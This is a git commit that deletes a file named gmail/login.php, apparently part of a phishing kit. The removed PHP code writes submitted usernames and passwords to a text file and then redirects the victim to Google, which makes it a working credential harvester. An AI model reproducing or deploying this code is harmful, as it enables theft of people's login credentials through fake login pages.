dc6f04847518dbcbc9874dad9438c993faddb1cd
Diego333-ms <66188985+Diego333-ms@users.noreply.github.com>
2020-10-20 13:56:30 -0300

    Delete login.php

--- gmail/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "Usuario: " . $_POST['username'] . " Senha: " . $_POST['password'] . "
-", FILE_APPEND);
-header('Location: https://www.google.com');
-exit();
